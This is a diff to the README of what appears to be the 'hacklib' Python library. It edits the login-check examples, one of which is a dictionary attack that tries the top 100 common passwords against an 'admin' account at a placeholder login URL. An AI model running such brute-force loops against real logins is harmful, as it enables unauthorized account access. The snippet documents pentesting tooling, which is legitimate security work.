@@ -41,11 +41,11 @@ htmldata = ac.login('http://yourwebsite.com/login', 'username', 'password')
 
 # For form-based logins, returns HTML whether login works or not.
 # Returns False if resulting page has the same URL as the login page
-if htmldata and 'try again' not in htmldata:
+if htmldata and 'try again' not in htmldata.lower():
     print 'Login Success'
 
 # Returns False if login fails using HTTP Basic Authentication
-if htmldata != False:
+if htmldata:
     print 'Login Success'
 ```
 Simple Dictionary Attack using AuthClient:
@@ -58,7 +58,8 @@ passwords = hacklib.topPasswords(100)
 
 for p in passwords:
     htmldata = ac.login('http://yourwebsite.com/login', 'admin', p)
-    if htmldata and 'try again' not in htmldata:
+    if htmldata and 'welcome' in htmldata.lower():
         print 'Password is', p
         break
+    # For HTTP Basic Authentication logins, simply use 'if htmldata:'
 ```
